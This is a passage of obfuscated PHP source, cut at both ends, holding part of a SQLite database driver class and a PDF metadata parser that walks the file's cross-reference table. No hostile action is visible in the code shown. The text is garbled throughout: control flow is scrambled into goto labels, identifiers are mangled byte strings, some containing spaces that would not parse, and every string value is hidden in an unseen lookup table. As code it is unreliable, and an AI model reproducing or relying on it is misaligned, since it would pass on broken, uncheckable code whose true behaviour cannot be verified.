Aª¹†ÊÜÃ›; FÓ›ÏªƒÍå: $aİãë—ŠÙ™ =& $_SERVER[Õİõş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto cµ‘÷«‹®ß; d¥éÎÁÒíš: if (!1 === $this->queryID) { $this->error(); return !1; } else { $C»ÌÆÒ§¹² = $this->getAll(); $this->numRows = count($C»ÌÆÒ§¹²); return $C»ÌÆÒ§¹²; } goto d‘”™”Ø¾¤; d‘”™”Ø¾¤: } public function execute($EĞÒªİòÀ‚) { goto EƒÇÜ ôÚ; dòß÷…¾ˆá: $this->queryStr = $EĞÒªİòÀ‚; if ($this->queryID) { $this->free(); } think_action_status($a‚ØóšÒõÂ[21], 1); goto eÖïŒæéå; eÖïŒæéå: think_status($a‚ØóšÒõÂ[20]); $e–ÚÛªßš = $this->_linkID->exec($EĞÒªİòÀ‚); $this->debug(); goto DÀğçÅÖµö; DÀğçÅÖµö: if (!1 === $e–ÚÛªßš) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto d¡ó¡ñÆßÉ; EƒÇÜ ôÚ: $a‚ØóšÒõÂ =& $_SERVER[Õİõş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto dòß÷…¾ˆá; d¡ó¡ñÆßÉ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Õİõş][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c¬º£âëóµ = $this->_linkID->query($_SERVER[Õİõş][23]); if (!$c¬º£âëóµ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $b—±ñÙïàÂ = $this->_linkID->query($_SERVER[Õİõş][24]); if (!$b—±ñÙïàÂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Ağ›²Ô‰Ÿ¯ = array(); while ($cˆÍ­© = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Ağ›²Ô‰Ÿ¯[] = $cˆÍ­©; } $this->queryID->reset(); return $Ağ›²Ô‰Ÿ¯; } public function getFields($f‚öï»ãÅ—) { $A¢ç¨õ§ÌĞ =& $_SERVER[Õİõş]; $c’©Ä‚ˆãÎ = $this->query($A¢ç¨õ§ÌĞ[25] . $f‚öï»ãÅ— . $A¢ç¨õ§ÌĞ[26]); $añÆÒÖ‹è± = array(); if ($c’©Ä‚ˆãÎ) { foreach ($c’©Ä‚ˆãÎ as $däÁõô»¶Û => $f„ÚÆ°Ú¸) { $añÆÒÖ‹è±[$f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[28]]] = array($A¢ç¨õ§ÌĞ[28] => $f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[28]], $A¢ç¨õ§ÌĞ[29] => $f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[29]], $A¢ç¨õ§ÌĞ[31] => (bool) ($f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[31]] === $A¢ç¨õ§ÌĞ[33]), $A¢ç¨õ§ÌĞ[34] => $f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[53]], $A¢ç¨õ§ÌĞ[36] => (bool) $f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[54]], $A¢ç¨õ§ÌĞ[39] => (bool) $f„ÚÆ°Ú¸[$A¢ç¨õ§ÌĞ[54]]); } } return $añÆÒÖ‹è±; } public function getTables($F¬’Ò¯”Û = '') { $dÜ«í÷‰Õ‘ =& $_SERVER[Õİõş]; $c½ĞÚàâ”Á = $this->query($dÜ«í÷‰Õ‘[42] . $dÜ«í÷‰Õ‘[43] . $dÜ«í÷‰Õ‘[44]); $E·¬—±‡®Ó = array(); foreach ($c½ĞÚàâ”Á as $CÄ­–ÅêòÖ => $DÙ­ãÓÙ‹ä) { $E·¬—±‡®Ó[$CÄ­–ÅêòÖ] = current($DÙ­ãÓÙ‹ä); } return $E·¬—±‡®Ó; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $e‘‹Öªí‹¬ =& $_SERVER[Õİõş]; $this->error = $this->_linkID->lastErrorMsg(); if ($e‘‹Öªí‹¬[33] != $this->queryStr) { $this->error .= LNG($e‘‹Öªí‹¬[45]) . $this->queryStr; } think_trace($this->error, $e‘‹Öªí‹¬[33], $e‘‹Öªí‹¬[46]); return $this->error; } public function escapeString($c¥µİáİÈ«) { $b¡£ÙŒ×œˆ =& $_SERVER[Õİõş]; if ($this->_linkID) { return $this->_linkID->escapeString($c¥µİáİÈ«); } return str_ireplace($b¡£ÙŒ×œˆ[55], $b¡£ÙŒ×œˆ[56], $c¥µİáİÈ«); } public function parseLimit($C‘½‡ôèè) { $C¥©ÕÅßï =& $_SERVER[Õİõş]; $C¦’†®ø»¹ = $C¥©ÕÅßï[33]; if (!empty($C‘½‡ôèè)) { $C‘½‡ôèè = explode($C¥©ÕÅßï[47], $C‘½‡ôèè); if (count($C‘½‡ôèè) > 1) { $C¦’†®ø»¹ .= $C¥©ÕÅßï[48] . $C‘½‡ôèè[1] . $C¥©ÕÅßï[49] . $C‘½‡ôèè[0] . $C¥©ÕÅßï[50]; } else { $C¦’†®ø»¹ .= $C¥©ÕÅßï[48] . $C‘½‡ôèè[0] . $C¥©ÕÅßï[50]; } } return $C¦’†®ø»¹; } } goto Cç¦…º¿«; B·¢—Ïï¾‹: class FileParsePdf { public static function parse($Bøö ù™¾) { goto Eº—¡‰¶§Ï; Eº—¡‰¶§Ï: $aªò‘ÜæÉ« =& $_SERVER[Õİõş]; $f•¨“˜¡ = 32 * 1024; $Bšß«Ø©êÙ = array($aªò‘ÜæÉ«[785] => fopen($Bøö ù™¾, $aªò‘ÜæÉ«[1165]), $aªò‘ÜæÉ«[75] => $Bøö ù™¾, $aªò‘ÜæÉ«[77] => filesize($Bøö ù™¾), $aªò‘ÜæÉ«[1508] => $f•¨“˜¡); goto bÆ‰ª—“ËÇ; f´›‰ŠÊ°»: $A˜×£à¤‹· = $aªò‘ÜæÉ«[1513]; preg_match($A˜×£à¤‹·, $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1509]], $dÓáãòäÀÙ); if (!$FäÎ³¹àä[$aªò‘ÜæÉ«[1512]] && count($dÓáãòäÀÙ) == 5) { $FäÎ³¹àä[$aªò‘ÜæÉ«[1512]] = $dÓáãòäÀÙ[3]; $FäÎ³¹àä[$aªò‘ÜæÉ«[1514]] = $dÓáãòäÀÙ[4]; } goto a¡Ÿáñ…ò; a¡Ÿáñ…ò: preg_match($A˜×£à¤‹·, $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1510]], $dÓáãòäÀÙ); if (!$FäÎ³¹àä[$aªò‘ÜæÉ«[1512]] && count($dÓáãòäÀÙ) == 5) { $FäÎ³¹àä[$aªò‘ÜæÉ«[1512]] = $dÓáãòäÀÙ[3]; $FäÎ³¹àä[$aªò‘ÜæÉ«[1514]] = $dÓáãòäÀÙ[4]; } preg_match($aªò‘ÜæÉ«[1515], $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1509]], $dÓáãòäÀÙ); goto bãàÜ„öÙù; f†åù‹Ö×ï: if ($dÓáãòäÀÙ[1] && $FäÎ³¹àä[$aªò‘ÜæÉ«[1516]] < $dÓáãòäÀÙ[1][0]) { $FäÎ³¹àä[$aªò‘ÜæÉ«[1516]] = $dÓáãòäÀÙ[1][0]; } $FäÎ³¹àä = self::parseInfoItem($FäÎ³¹àä); return $FäÎ³¹àä; goto b†ø«‡À‡; bãàÜ„öÙù: if ($dÓáãòäÀÙ) { $FäÎ³¹àä[$aªò‘ÜæÉ«[1324]] = $dÓáãòäÀÙ[1]; } $FäÎ³¹àä[$aªò‘ÜæÉ«[1516]] = 0; $A˜×£à¤‹· = $aªò‘ÜæÉ«[1517]; goto d¡§Ò—«ğ¯; Dä¥Ä‰¶µ“: if ($aÈ¿¹Şå¸õ) { $A¶‚ËòÃì = $aÈ¿¹Şå¸õ[$aªò‘ÜæÉ«[1511]][$aªò‘ÜæÉ«[1187]]; $FäÎ³¹àä = self::getObjectValue($Bšß«Ø©êÙ, $aÈ¿¹Şå¸õ, $A¶‚ËòÃì); } $FäÎ³¹àä = is_array($FäÎ³¹àä) ? $FäÎ³¹àä : array(); $FäÎ³¹àä[$aªò‘ÜæÉ«[1512]] = 0; goto f´›‰ŠÊ°»; d¡§Ò—«ğ¯: preg_match_all($A˜×£à¤‹·, $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1509]], $dÓáãòäÀÙ); if ($dÓáãòäÀÙ[1] && $FäÎ³¹àä[$aªò‘ÜæÉ«[1516]] < $dÓáãòäÀÙ[1][0]) { $FäÎ³¹àä[$aªò‘ÜæÉ«[1516]] = $dÓáãòäÀÙ[1][0]; } preg_match_all($A˜×£à¤‹·, $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1510]], $dÓáãòäÀÙ); goto f†åù‹Ö×ï; bÆ‰ª—“ËÇ: $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1509]] = StreamWrapperIO::read($Bøö ù™¾, 0, $f•¨“˜¡); $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[1510]] = StreamWrapperIO::read($Bøö ù™¾, $Bšß«Ø©êÙ[$aªò‘ÜæÉ«[77]] - $f•¨“˜¡, $f•¨“˜¡); $aÈ¿¹Şå¸õ = self::decodeXref($Bšß«Ø©êÙ); goto Dä¥Ä‰¶µ“; b†ø«‡À‡: } private static function parseInfoItem($CœâØìœ¾œ) { $fÜ„‘Îôù =& $_SERVER[Õİõş]; if (!$CœâØìœ¾œ) { return !1; } $e²‘ç®© — = array($fÜ„‘Îôù[1325] => array($fÜ„‘Îôù[1518], $fÜ„‘Îôù[33]), $fÜ„‘Îôù[1519] => array($fÜ„‘Îôù[1520], $fÜ„‘Îôù[33]), $fÜ„‘Îôù[183] => array($fÜ„‘Îôù[1521], $fÜ„‘Îôù[206]), $fÜ„‘Îôù[106] => array($fÜ„‘Îôù[1522], $fÜ„‘Îôù[206]), $fÜ„‘Îôù[1516] => array($fÜ„‘Îôù[1516], $fÜ„‘Îôù[272]), $fÜ„‘Îôù[1512] => array($fÜ„‘Îôù[1512], $fÜ„‘Îôù[272]), $fÜ„‘Îôù[1514] => array($fÜ„‘Îôù[1514], $fÜ„‘Îôù[272]), $fÜ„‘Îôù[1523] => array($fÜ„‘Îôù[1524], $fÜ„‘Îôù[33]), $fÜ„‘Îôù[1525] => array($fÜ„‘Îôù[1526], $fÜ„‘Îôù[33]), $fÜ„‘Îôù[1527] => array($fÜ„‘Îôù[1324], $fÜ„‘Îôù[33])); $D±„Œã¬Ü = array(); foreach ($e²‘ç®© — as $aÖãßÃ”ºÛ => $cÑˆÉ±Ê±ã) { if (!isset($CœâØìœ¾œ[$cÑˆÉ±Ê±ã[0]])) { continue; } $e¬ï¨éŸ± = $CœâØìœ¾œ[$cÑˆÉ±Ê±ã[0]]; if (!$e¬ï¨éŸ± || is_array($e¬ï¨éŸ±)) { continue; } switch ($cÑˆÉ±Ê±ã[1]) { case $fÜ„‘Îôù[272]: $e¬ï¨éŸ± = intval($e¬ï¨éŸ±); break; case $fÜ„‘Îôù[206]: if (substr($e¬ï¨éŸ±, 0, 2) == $fÜ„‘Îôù[1528]) { $e¬ï¨éŸ± = substr($e¬ï¨éŸ±, 2, 14); } if (strtotime($e¬ï¨éŸ±)) { $e¬ï¨éŸ± = date($fÜ„‘Îôù[1529], strtotime($e¬ï¨éŸ±)); } break; } $D±„Œã¬Ü[$aÖãßÃ”ºÛ] = $e¬ï¨éŸ±; } return $D±„Œã¬Ü; } private static function decodeXref(&$C¹ç‡İÖƒ’) { goto CßİØÔÉ½; B‰ Ü”ë¡Å: if ($C¹ç‡İÖƒ’[$Fíº”ÄñŞù[77]] - $A©Ò½Å®‰ƒ > $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1508]]) { $F”îÁÊ = 4 * $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1508]]; $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1508]] = $F”îÁÊ; $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1509]] = StreamWrapperIO::read($C¹ç‡İÖƒ’[$Fíº”ÄñŞù[75]], 0, $F”îÁÊ); $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1510]] = StreamWrapperIO::read($C¹ç‡İÖƒ’[$Fíº”ÄñŞù[75]], $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[77]] - $F”îÁÊ, $F”îÁÊ); $D¬¶Ñ¦ÂŠ = $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1510]]; } $a»ëÈŒ‚ = 0; preg_match_all($Fíº”ÄñŞù[1532], $D¬¶Ñ¦ÂŠ, $d†Áòàêˆ); goto dˆ‡—¹îÏ; CßİØÔÉ½: $Fíº”ÄñŞù =& $_SERVER[Õİõş]; $D¬¶Ñ¦ÂŠ = $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1510]]; $C¿Ì¬ğÅŒ = array($Fíº”ÄñŞù[1511] => array(), $Fíº”ÄñŞù[1530] => array()); goto c´ôßï’ï¸; dˆ‡—¹îÏ: foreach ($d†Áòàêˆ[3] as $DóŠŒ•ø¥Š => $DÍìòèğ»Û) { if ($d†Áòàêˆ[3][$DóŠŒ•ø¥Š] == $Fíº”ÄñŞù[1533]) { $bä©ÏƒãÀó = $a»ëÈŒ‚ . $Fíº”ÄñŞù[70] . intval($d†Áòàêˆ[2][$DóŠŒ•ø¥Š]); $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1530]][$bä©ÏƒãÀó] = intval($d†Áòàêˆ[1][$DóŠŒ•ø¥Š]); ++$a»ëÈŒ‚; } else { if ($d†Áòàêˆ[3][$DóŠŒ•ø¥Š] == $Fíº”ÄñŞù[1534]) { ++$a»ëÈŒ‚; } else { } } } if (preg_match_all($Fíº”ÄñŞù[1535], $D¬¶Ñ¦ÂŠ, $d†Áòàêˆ)) { $BÍ¨ÑÓÓğº = $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[77]] - $C¹ç‡İÖƒ’[$Fíº”ÄñŞù[1508]]; foreach ($d†Áòàêˆ[0] as $DóŠŒ•ø¥Š => $BÜ’ÇÛóˆË) { $e°‰‰¦«² = $d†Áòàêˆ[1][$DóŠŒ•ø¥Š] . $Fíº”ÄñŞù[70] . $d†Áòàêˆ[2][$DóŠŒ•ø¥Š]; $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1530]][$e°‰‰¦«²] = strpos($D¬¶Ñ¦ÂŠ, $BÜ’ÇÛóˆË) + $BÍ¨ÑÓÓğº + 1; } } if (preg_match_all($Fíº”ÄñŞù[1536], $D¬¶Ñ¦ÂŠ, $d†Áòàêˆ)) { $DŒ…£®Çæ‚ = count($d†Áòàêˆ[1]) == 1 ? $d†Áòàêˆ[1][0] : $d†Áòàêˆ[1][1]; } else { $DŒ…£®Çæ‚ = substr($D¬¶Ñ¦ÂŠ, -1024 * 5); } goto a¹àØ¡İçå; c´ôßï’ï¸: $aÉ ÒÅÅ = $Fíº”ÄñŞù[1531]; if (!preg_match_all($aÉ ÒÅÅ, $D¬¶Ñ¦ÂŠ, $d†Áòàêˆ, PREG_SET_ORDER, 0)) { return !1; } $A©Ò½Å®‰ƒ = intval($d†Áòàêˆ[0][1]); goto B‰ Ü”ë¡Å; aÉñ•†Ú±: if (preg_match($Fíº”ÄñŞù[1542], $DŒ…£®Çæ‚, $d†Áòàêˆ) > 0) { $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[1187]] = intval($d†Áòàêˆ[1]) . $Fíº”ÄñŞù[70] . intval($d†Áòàêˆ[2]); } if (preg_match($Fíº”ÄñŞù[1543], $DŒ…£®Çæ‚, $d†Áòàêˆ) > 0) { $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[363]] = array(); $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[363]][0] = $d†Áòàêˆ[1]; $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[363]][1] = $d†Áòàêˆ[2]; } if (!$C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[1187]]) { return !1; } goto a™÷ã¢²˜é; a™÷ã¢²˜é: if (preg_match($Fíº”ÄñŞù[1544], $DŒ…£®Çæ‚, $d†Áòàêˆ) > 0) { } return $C¿Ì¬ğÅŒ; goto cÔƒ¶ÀˆÁ; a¹àØ¡İçå: if (preg_match($Fíº”ÄñŞù[1537], $DŒ…£®Çæ‚, $d†Áòàêˆ) > 0) { $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[77]] = intval($d†Áòàêˆ[1]); } if (preg_match($Fíº”ÄñŞù[1538], $DŒ…£®Çæ‚, $d†Áòàêˆ) > 0) { $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[1539]] = intval($d†Áòàêˆ[1]) . $Fíº”ÄñŞù[70] . intval($d†Áòàêˆ[2]); } if (preg_match($Fíº”ÄñŞù[1540], $DŒ…£®Çæ‚, $d†Áòàêˆ) > 0) { $C¿Ì¬ğÅŒ[$Fíº”ÄñŞù[1511]][$Fíº”ÄñŞù[1541]] = intval($d†Áòàêˆ[1]) . $Fíº”ÄñŞù[70] . intval($d†Áòàêˆ[2]); } goto aÉñ•†Ú±; cÔƒ¶ÀˆÁ: } private static function getObjectValue($FÌî‰Ä›¶ç, $F£åÈ÷ğĞò, $F½‰ò¼£‰”) { goto d’ÕÒÆ‰º®; DŒõ’‰—‘¯: if (!is_array($D–É¼Õçèô[1])) { return array(); } $F¤İ Çâï¤ = array(); for ($aÖ®÷ÊÁÆ“ = 0; $aÖ®÷ÊÁÆ“ < count($D–É¼Õçèô[1]); $aÖ®÷ÊÁÆ“ += 2) { $f›†¼‘™ÚÄ = $D–É¼Õçèô[1][$aÖ®÷ÊÁÆ“]; $eÈ¨æ—ŒÀ = $D–É¼Õçèô[1][$aÖ®÷ÊÁÆ“ + 1]; if (count($f›†¼‘™ÚÄ) == 3 && $f›†¼‘™ÚÄ[0] == $DĞáÙÌÖÑ¯[8]) { $b‰Ø‚ËïÖÉ = !1; if ($eÈ¨æ—ŒÀ[0] == $DĞáÙÌÖÑ¯[1545]) { $eÈ¨æ—ŒÀ = self::getObject($FÌî‰Ä›¶ç, $F£åÈ÷ğĞò[$DĞáÙÌÖÑ¯[1530]][$eÈ¨æ—ŒÀ[1]]); } $b‰Ø‚ËïÖÉ = $eÈ¨æ—ŒÀ[1]; if ($b‰Ø‚ËïÖÉ === !1) { continue; } if (is_string($b‰Ø‚ËïÖÉ)) { $b‰Ø‚ËïÖÉ = self::decodeStr($b‰Ø‚ËïÖÉ); } $F¤İ Çâï¤[$f›†¼‘™ÚÄ[1]] = $b‰Ø‚ËïÖÉ; } } goto aôë„ÍÌ³; aôë„ÍÌ³: return $F¤İ Çâï¤; goto D½¼Àæ¸¿à; d’ÕÒÆ‰º®: $DĞáÙÌÖÑ¯ =& $_SERVER[Õİõş]; $D–É¼Õçèô = self::getObject($FÌî‰Ä›¶ç, $F£åÈ÷ğĞò[$DĞáÙÌÖÑ¯[1530]][$F½‰ò¼£‰”]); if (is_string($D–É¼Õçèô[1])) { return $D–É¼Õçèô[1]; } goto DŒõ’‰—‘¯; D½¼Àæ¸¿à: } private static function getObject($B¥­Õç‹¹, $cË˜·®©ÀÄ) { $EÏ¥Ú‰¥Æƒ = self::getObjectItem($B¥­Õç‹¹, $cË˜·®©ÀÄ); $EÏ¥Ú‰¥Æƒ = self::getObjectItem($B¥­Õç‹¹, $EÏ¥Ú‰¥Æƒ[2]); return $EÏ¥Ú‰¥Æƒ; } private static function getObjectItem($c”î…„ùÀ°, $DÌèèëîªæ) { goto bçÌØê•°; E‘Øˆé„îË: $E£œÔŠÃÉ = self::getRawObject($FÖ¡¦¦Òèè, $E¶ÊÓÅË“); if ($DÌèèëîªæ >= $d³ÜÌ—Æ¼) { $E£œÔŠÃÉ[2] = $E£œÔŠÃÉ[2] + $d³ÜÌ—Æ¼; } else { if ($DÌèèëîªæ > $Dò‘…³ && $DÌèèëîªæ <= $d³ÜÌ—Æ¼) { $E£œÔŠÃÉ[2] = $E£œÔŠÃÉ[2] + $DÌèèëîªæ; } } return $E£œÔŠÃÉ; goto bŒ‚–Ø¹£¸; bçÌØê•°: $fÎµÜİí½¢ =& $_SERVER[Õİõş]; $Dò‘…³ = $c”î…„ùÀ°[$fÎµÜİí½¢[1508]]; $d³ÜÌ—Æ¼ = $c”î…„ùÀ°[$fÎµÜİí½¢[77]] - $Dò‘…³; goto cÂ›¹Ü¨; cÂ›¹Ü¨: $E¶ÊÓÅË“ = $DÌèèëîªæ >= $d³ÜÌ—Æ¼ ? $DÌèèëîªæ - $d³ÜÌ—Æ¼ : $DÌèèëîªæ; $FÖ¡¦¦Òèè = $DÌèèëîªæ >= $d³ÜÌ—Æ¼ ? $c”î…„ùÀ°[$fÎµÜİí½¢[1510]] : $c”î…„ùÀ°[$fÎµÜİí½¢[1509]]; if ($DÌèèëîªæ > $Dò‘…³ && $DÌèèëîªæ <= $d³ÜÌ—Æ¼) { $E¶ÊÓÅË“ = 0; $FÖ¡¦¦Òèè = StreamWrapperIO::read($c”î…„ùÀ°[$fÎµÜİí½¢[75]], $DÌèèëîªæ, $Dò‘…³); } goto E‘Øˆé„îË; bŒ‚–Ø¹£¸: } private static function decodeStr($CŠˆ‹­™Ğ¬) { goto DŠÏ…ëìÉ; E÷òÌÌ„©Ë: $CŠˆ‹­™Ğ¬ = $F¥’ğ¦ß´[33]; foreach ($FË­ÎØñãé as $c§ö“ï…„”) { if (preg_match($F¥’ğ¦ß´[1560], $c§ö“ï…„”) && !1 === stripos($c§ö“ï…„”, $F¥’ğ¦ß´[1561])) { $c§ö“ï…„” = preg_replace($F¥’ğ¦ß´[1562], $F¥’ğ¦ß´[33], $c§ö“ï…„”); $c§ö“ï…„” = trim($c§ö“ï…„”, $F¥’ğ¦ß´[930]); $c§ö“ï…„” = pack($F¥’ğ¦ß´[1563], $c§ö“ï…„”); $CŠˆ‹­™Ğ¬ .= $c§ö“ï…„”; } else { $CŠˆ‹­™Ğ¬ .= $c§ö“ï…„”; } } if (preg_match($F¥’ğ¦ß´[1564], $CŠˆ‹­™Ğ¬)) { $B³¸äìÚ = substr($CŠˆ‹­™Ğ¬, 2); $CŠˆ‹­™Ğ¬ = $F¥’ğ¦ß´[33]; $FĞæŸ¢Ÿ›ñ = strlen($B³¸äìÚ); for ($F¦–ÃË¹§ = 0; $F¦–ÃË¹§ < $FĞæŸ¢Ÿ›ñ; $F¦–ÃË¹§ += 2) { $Fß“‡îğÁ¤ = hexdec(bin2hex(substr($B³¸äìÚ, $F¦–ÃË¹§, 2))); $CŠˆ‹­™Ğ¬ .= mb_convert_encoding($F¥’ğ¦ß´[1565] . intval($Fß“‡îğÁ¤) . $F¥’ğ¦ß´[67], $F¥’ğ¦ß´[1566], $F¥’ğ¦ß´[1567]); } } goto a½¹ˆÇÚ; E‚İ‹‡øè: $CŠˆ‹­™Ğ¬ = $F¥’ğ¦ß´[33]; foreach ($FË­ÎØñãé as $c§ö“ï…„”) { if (preg_match($F¥’ğ¦ß´[1555], $c§ö“ï…„”)) { $CŠˆ‹­™Ğ¬ .= \chr(octdec(trim($c§ö“ï…„”, $F¥’ğ¦ß´[93]))); } else { $CŠˆ‹­™Ğ¬ .= $c§ö“ï…„”; } } $FË­ÎØñãé = preg_split($F¥’ğ¦ß´[1556], $CŠˆ‹­™Ğ¬, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto eÛÆåÄóØ—; DŠÏ…ëìÉ: $F¥’ğ¦ß´ =& $_SERVER[Õİõş]; $CŠˆ‹­™Ğ¬ = str_replace(array($F¥’ğ¦ß´[1546], $F¥’ğ¦ß´[1547], $F¥’ğ¦ß´[1548], $F¥’ğ¦ß´[1549], $F¥’ğ¦ß´[1550], $F¥’ğ¦ß´[1551], $F¥’ğ¦ß´[1552], $F¥’ğ¦ß´[1553]), array($F¥’ğ¦ß´[93], $F¥’ğ¦ß´[50], $F¥’ğ¦ß´[8], $F¥’ğ¦ß´[244], $F¥’ğ¦ß´[821], $F¥’ğ¦ß´[213], $F¥’ğ¦ß´[994], $F¥’ğ¦ß´[326]), $CŠˆ‹­™Ğ¬); $FË­ÎØñãé = preg_split($F¥’ğ¦ß´[1554], $CŠˆ‹­™Ğ¬, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E‚İ‹‡øè; eÛÆåÄóØ—: $CŠˆ‹­™Ğ¬ = $F¥’ğ¦ß´[33]; foreach ($FË­ÎØñãé as $c§ö“ï…„”) { if (preg_match($F¥’ğ¦ß´[1557], $c§ö“ï…„”)) { $CŠˆ‹­™Ğ¬ .= \chr(hexdec(trim($c§ö“ï…„”, $F¥’ğ¦ß´[1558]))); } else { $CŠˆ‹­™Ğ¬ .= $c§ö“ï…„”; } } $FË­ÎØñãé = preg_split($F¥’ğ¦ß´[1559], $CŠˆ‹­™Ğ¬, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E÷òÌÌ„©Ë; a½¹ˆÇÚ: return $CŠˆ‹­™Ğ¬; goto eŸšº£ï; eŸšº£ï: } private static function getRawObject($d…«¡ é–­, $Cñ„»¯çô = 0) { goto bÇí®×‰çÒ; BòŸçò¬ª: return array($F¸Ğ¯µØ, $a§ÛÂáîˆˆ, $Cñ„»¯çô); goto E‰‚Ÿ¼ïÙà; bÇí®×‰çÒ: $AáõƒäÖÄ† =& $_SERVER[Õİõş]; $F¸Ğ¯µØ = $AáõƒäÖÄ†[33]; $a§ÛÂáîˆˆ = $AáõƒäÖÄ†[33]; goto E¬©ÍÁ¸İï; E¬©ÍÁ¸İï: $Cñ„»¯çô += strspn($d…«¡ é–­, $AáõƒäÖÄ†[1568], $Cñ„»¯çô); $fâöá“¸ÌÈ = $d…«¡ é–­[$Cñ„»¯çô]; switch ($fâöá“¸ÌÈ) { case $AáõƒäÖÄ†[1569]: $AğŞÓå¼† = strcspn($d…«¡ é–­, $AáõƒäÖÄ†[1570], $Cñ„»¯çô); if ($AğŞÓå¼† > 0) { $Cñ„»¯çô += $AğŞÓå¼†; return self::getRawObject($d…«¡ é–­, $Cñ„»¯çô); } break; case $AáõƒäÖÄ†[8]: $F¸Ğ¯µØ = $fâöá“¸ÌÈ; ++$Cñ„»¯çô; $d¶íĞË‡Ş– = preg_match($AáõƒäÖÄ†[1571], substr($d…«¡ é–­, $Cñ„»¯çô, 256), $cé…”Ìîè„); if (1 == $d¶íĞË‡Ş–) { $a§ÛÂáîˆˆ = $cé…”Ìîè„[1]; $Cñ„»¯çô += strlen($a§ÛÂáîˆˆ); } break; case $AáõƒäÖÄ†[244]: case $AáõƒäÖÄ†[821]: $F¸Ğ¯µØ = $fâöá“¸ÌÈ; ++$Cñ„»¯çô; $Bùêè¦˜ïµ = $Cñ„»¯çô; if ($AáõƒäÖÄ†[244] == $fâöá“¸ÌÈ) { $a‰“ñÅ…Óƒ = 1; while ($a‰“ñÅ…Óƒ > 0) { if (!isset($d…«¡ é–­[$Bùêè¦˜ïµ])) { break; } $E–ğ”¿ÅÆ = $d…«¡ é–­[$Bùêè¦˜ïµ]; switch ($E–ğ”¿ÅÆ) { case $AáõƒäÖÄ†[93]: ++$Bùêè¦˜ïµ; break; case $AáõƒäÖÄ†[244]: ++$a‰“ñÅ…Óƒ; break; case $AáõƒäÖÄ†[821]: --$a‰“ñÅ…Óƒ; break; } ++$Bùêè¦˜ïµ; } $a§ÛÂáîˆˆ = substr($d…«¡ é–­, $Cñ„»¯çô, $Bùêè¦˜ïµ - $Cñ„»¯çô - 1); $Cñ„»¯çô = $Bùêè¦˜ïµ; } break; case $AáõƒäÖÄ†[153]: case $AáõƒäÖÄ†[471]: $F¸Ğ¯µØ = $fâöá“¸ÌÈ; ++$Cñ„»¯çô; if ($AáõƒäÖÄ†[153] == $fâöá“¸ÌÈ) { $a§ÛÂáîˆˆ = array(); do { $d½ô­¿Á¦¤ = $Cñ„»¯çô; $béíéˆ»‚± = self::getRawObject($d…«¡ é–­, $Cñ„»¯çô); $Cñ„»¯çô = $béíéˆ»‚±[2]; $a§ÛÂáîˆˆ[] = $béíéˆ»‚±; } while ($AáõƒäÖÄ†[471] != $béíéˆ»‚±[0] && $Cñ„»¯çô != $d½ô­¿Á¦¤); array_pop($a§ÛÂáîˆˆ); } break; case $AáõƒäÖÄ†[929]: case $AáõƒäÖÄ†[932]: if (isset($d…«¡ é–­[$Cñ„»¯çô + 1]) && $d…«¡ é–­[$Cñ„»¯çô + 1] == $fâöá“¸ÌÈ) { $F¸Ğ¯µØ = $fâöá“¸ÌÈ . $fâöá“¸ÌÈ; $Cñ„»¯çô += 2; if ($AáõƒäÖÄ†[929] == $fâöá“¸ÌÈ) { $a§ÛÂáîˆˆ = array(); do { $d½ô­¿Á¦¤ = $Cñ„»¯çô; $béíéˆ»‚± = self::getRawObject($d…«¡ é–­, $Cñ„»¯çô); $Cñ„»¯çô = $béíéˆ»‚±[2]; $a§ÛÂáîˆˆ[] = $béíéˆ»‚±; } while ($AáõƒäÖÄ†[1572] != $béíéˆ»‚±[0] && $Cñ„»¯çô != $d½ô­¿Á¦¤); 